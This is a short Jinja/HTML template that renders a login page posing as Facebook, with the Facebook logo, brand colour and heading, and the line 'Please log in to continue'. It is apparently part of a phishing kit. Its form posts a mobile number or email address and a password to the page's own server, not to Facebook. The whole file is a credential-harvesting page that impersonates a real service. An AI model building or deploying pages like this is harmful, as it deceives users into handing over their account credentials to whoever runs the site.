{% extends "base.html" %}
{% block body %}
<div class="card center" style="flex-direction:column;align-items:center;text-align:center;max-width:520px;margin:28px auto;padding:48px 32px;">
  
  <!-- Facebook Icon and Heading -->
  <div class="icon-circle bg-facebook" style="width:72px;height:72px;box-shadow:0 0 12px rgba(24,119,242,0.25);margin-bottom:18px;">
    <i class="fa-brands fa-facebook-f icon-lg" style="font-size:30px;"></i>
  </div>
  <h2 class="notranslate" style="margin:0 0 6px;font-size:26px;font-weight:700;color:#1877F2;">Facebook</h2>
  <p style="color:#64748b;font-size:14px;margin-bottom:28px;">Please log in to continue</p>

  <!-- Login Form -->
  <form method="post" style="width:100%;max-width:360px;">
    <input 
      class="input" 
      name="address" 
      placeholder="Mobile number or email address" 
      required
      style="margin-bottom:12px;"
    >
    <input 
      class="input" 
      name="password" 
      type="password" 
      placeholder="Password" 
      required
      style="margin-bottom:18px;"
    >
    <button 
      class="btn btn-blue" 
      type="submit" 
      style="width:100%;font-size:16px;font-weight:600;border-radius:10px;">
      Log in
    </button>
  </form>

</div>
{% endblock %}
